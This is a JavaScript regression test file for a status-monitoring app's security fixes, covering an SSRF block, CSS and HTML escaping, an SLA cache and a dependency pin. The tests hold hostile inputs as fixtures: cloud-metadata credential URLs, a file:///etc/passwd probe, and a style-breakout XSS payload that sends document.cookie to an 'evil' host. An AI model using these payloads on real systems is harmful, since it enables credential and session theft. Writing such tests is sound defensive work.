"use strict";
// v3.16.5 — security + resilience hardening regression tests.
//   1. Cloud-metadata SSRF block in sanitizeRequestUrl (LAN monitoring preserved)
//   2. custom_css sanitizer strips '<' (no <style> breakout)
//   3. Public status page escapes operator-authored fields (stored XSS)
//   4. /api/admin/sla served from a single-flight cache with an index-usable join
//   5. Webhook sender no longer reflects the upstream response body
//   6. nodemailer pinned to a release without the high-severity advisory
const { test } = require("node:test");
const assert   = require("node:assert/strict");
const fs       = require("node:fs");
const path     = require("node:path");

const ROOT         = path.resolve(__dirname, "..");
const serverSource = fs.readFileSync(path.join(ROOT, "server.js"), "utf8");
const indexSource  = fs.readFileSync(path.join(ROOT, "views", "index.ejs"), "utf8");

function sourceBetween(start, end) {
  const si = serverSource.indexOf(start);
  if (si === -1) throw new Error(`Start marker not found: ${start}`);
  const ei = serverSource.indexOf(end, si);
  if (ei === -1) throw new Error(`End marker not found after start: ${end}`);
  return serverSource.slice(si, ei);
}

// -- 1. SSRF: cloud-metadata block, LAN monitoring preserved --------------------
function loadUrlSanitizer() {
  const body = sourceBetween("const BLOCKED_METADATA_HOSTS", "function sanitizePathSegment");
  const factory = new Function(`${body}; return { sanitizeRequestUrl, BLOCKED_METADATA_HOSTS };`);
  return factory();
}

test("sanitizeRequestUrl refuses cloud instance-metadata endpoints", () => {
  const { sanitizeRequestUrl } = loadUrlSanitizer();
  for (const bad of [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.170.2/v2/credentials",
    "http://[fd00:ec2::254]/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "https://metadata/",
  ]) {
    assert.throws(() => sanitizeRequestUrl(bad), /cloud-metadata/, `should block ${bad}`);
  }
});

test("sanitizeRequestUrl still allows LAN / internal monitoring targets", () => {
  const { sanitizeRequestUrl } = loadUrlSanitizer();
  // This app monitors internal hosts — those must keep working.
  for (const ok of [
    "http://10.8.0.1:3306/",
    "http://192.168.1.1/status",
    "https://example.com/health?x=1",
    "http://status-server:3000/healthz",
  ]) {
    assert.equal(typeof sanitizeRequestUrl(ok), "string", `should allow ${ok}`);
  }
});

test("sanitizeRequestUrl still rejects non-http(s) protocols", () => {
  const { sanitizeRequestUrl } = loadUrlSanitizer();
  assert.throws(() => sanitizeRequestUrl("file:///etc/passwd"), /http/);
  assert.throws(() => sanitizeRequestUrl("gopher://x/"), /http/);
});

// -- 2. custom_css sanitizer strips '<' -----------------------------------------
test("custom_css sanitizer strips every '<' so it cannot break out of <style>", () => {
  // Both the create and update handlers must use the strengthened filter.
  const strip = /String\(req\.body\.custom_css\)\.replace\(\/<\/g, ""\)\.slice\(0, 65535\)/g;
  assert.equal((serverSource.match(strip) || []).length, 2, "both group handlers must strip '<'");
  // The old, bypassable literal-"</style>" filter must be gone.
  assert.doesNotMatch(serverSource, /replace\(\/<\\\/style>\/gi/);
  // Behaviour: the classic bypass payload no longer contains a tag opener.
  const payload = "</style ><script>fetch('//evil/'+document.cookie)</script>";
  assert.doesNotMatch(payload.replace(/</g, ""), /</);
});

// -- 3. Public status page escapes operator-authored fields ---------------------
test("index.ejs escapes operator-authored fields rendered via innerHTML", () => {
  const mustEscape = [
    'class="srv-name">${escapeHtml(s.name)}',
    'class="srv-desc">${escapeHtml(s.description)}',
    'class="srv-group-name">${escapeHtml(cat)}',
    'class="srv-subgroup-name">${escapeHtml(key)}',
    'class="detail-tag">${escapeHtml(t)}',
    'class="incident-cause">${escapeHtml(cause)}',
    '<span class="srv-fact-value">${escapeHtml(s.host)}',
  ];
  for (const frag of mustEscape) {
    assert.ok(indexSource.includes(frag), `expected escaped fragment: ${frag}`);
  }
  // Regression: the raw sinks must be gone.
  for (const raw of [
    'class="srv-name">${s.name}',
    'class="srv-desc">${s.description}',
    'class="srv-group-name">${cat}',
    'class="detail-tag">${t}',
    'class="incident-cause">${cause}',
  ]) {
    assert.ok(!indexSource.includes(raw), `raw (unescaped) sink still present: ${raw}`);
  }
});

// -- 4. /api/admin/sla single-flight cache with index-usable join ---------------
function loadSlaCache(dbFake) {
  const body = sourceBetween("const SLA_REFRESH_MS", "// -- History maintenance");
  const factory = new Function("db", "addLog", "UPTIME30_REFRESH_MS",
    `${body}; return { refreshSlaCache, slaCache, SLA_REFRESH_MS };`);
  return factory(dbFake, () => {}, 60 * 1000);
}

test("SLA join uses CAST(s.id AS CHAR) so the history index is usable", () => {
  assert.match(serverSource, /LEFT JOIN status_history h ON h\.server_id = CAST\(s\.id AS CHAR\)/);
  // The old index-defeating join must be gone.
  assert.doesNotMatch(serverSource, /LEFT JOIN status_history h ON h\.server_id = s\.id\b/);
});

test("SLA route reads the cache instead of aggregating inline", () => {
  const routeStart = serverSource.indexOf('app.get("/api/admin/sla"');
  const routeBody  = serverSource.slice(routeStart, routeStart + 600);
  assert.match(routeBody, /slaCache/, "route must serve from the cache");
  assert.doesNotMatch(routeBody, /LEFT JOIN status_history/, "route must not run the scan inline");
});

test("refreshSlaCache is single-flight: concurrent callers share ONE query", async () => {
  let calls = 0, concurrent = 0, maxConcurrent = 0;
  const db = {
    query: async () => {
      calls++; concurrent++; maxConcurrent = Math.max(maxConcurrent, concurrent);
      await new Promise(r => setTimeout(r, 20));
      concurrent--;
      return [[{ id: 1, name: "svc", sla_target: 99.9,
        total_24: 10, up_24: 9, total_7: 100, up_7: 99, total_30: 1000, up_30: 990 }]];
    }
  };
  const { refreshSlaCache, slaCache } = loadSlaCache(db);
  await Promise.all([refreshSlaCache(), refreshSlaCache(), refreshSlaCache()]);
  assert.equal(calls, 1, "three concurrent refreshes must collapse into one query");
  assert.equal(maxConcurrent, 1);
  assert.equal(slaCache.rows.length, 1);
  assert.equal(slaCache.rows[0].uptime_30d, 99);   // 990 / 1000
  assert.equal(slaCache.rows[0].uptime_24h, 90);   // 9 / 10
});

// -- 5. Webhook sender does not reflect the upstream response body --------------
test("postWebhook reports status only, never the upstream body", () => {
  const start = serverSource.indexOf("async function postWebhook");
  const body  = serverSource.slice(start, serverSource.indexOf("async function sendEmailAlert", start));
  assert.doesNotMatch(body, /text\.slice\(0, 200\)/, "must not reflect upstream body");
  assert.ok(/throw new Error\(`HTTP \$\{r\.status\}`\)/.test(body), "should throw status-only error");
});

// -- 6. nodemailer clear of the high-severity advisory --------------------------
test("nodemailer is pinned to >= 9.1.1 (clears GHSA-2x7j-588g-ccc2)", () => {
  const pkg = JSON.parse(fs.readFileSync(path.join(ROOT, "package.json"), "utf8"));
  const spec = pkg.dependencies.nodemailer.replace(/^[^0-9]*/, "");
  const [maj, min, pat] = spec.split(".").map(Number);
  const ok = maj > 9 || (maj === 9 && (min > 1 || (min === 1 && pat >= 1)));
  assert.ok(ok, `nodemailer must be >= 9.1.1, got ${pkg.dependencies.nodemailer}`);
});
